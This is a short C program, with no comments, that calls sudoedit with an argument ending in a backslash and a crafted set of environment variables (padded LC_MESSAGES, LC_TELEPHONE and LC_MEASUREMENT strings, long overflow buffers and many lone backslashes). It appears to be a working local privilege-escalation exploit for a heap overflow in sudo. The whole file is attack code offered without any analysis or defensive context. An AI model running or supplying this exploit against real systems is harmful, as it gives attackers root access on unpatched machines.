#include <unistd.h>
#include <string.h>

void main(int argc, char **argv) {
    int i;
    char buf[0xf0] = {0};
    memset(buf, 'Y', 0xe0);
    strcat(buf, "\\");

    char* command[] = {
        "sudoedit",
        "-s",
        buf,
        NULL
    };
    
    char message[0xe0] = {"LC_MESSAGES=en_GB.UTF-8@"};
    memset(message + strlen(message), 'A', 0xb8);

    char telephone[0x50] = {"LC_TELEPHONE=C.UTF-8@"};
    memset(telephone + strlen(telephone), 'A', 0x28);

    char measurement[0x50] = {"LC_MEASUREMENT=C.UTF-8@"};
    memset(measurement + strlen(measurement), 'A', 0x28);

    char overflow[0x500] = {0};
    memset(overflow, 'X', 0x4cf);
    strcat(overflow, "\\");

    char *envp[] = {
        overflow,
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "XXXXXXX\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "x/x\\",
        "Z",
        message,
        telephone,
        measurement,
        NULL
    };

    execve("/usr/bin/sudoedit", command, envp);
}
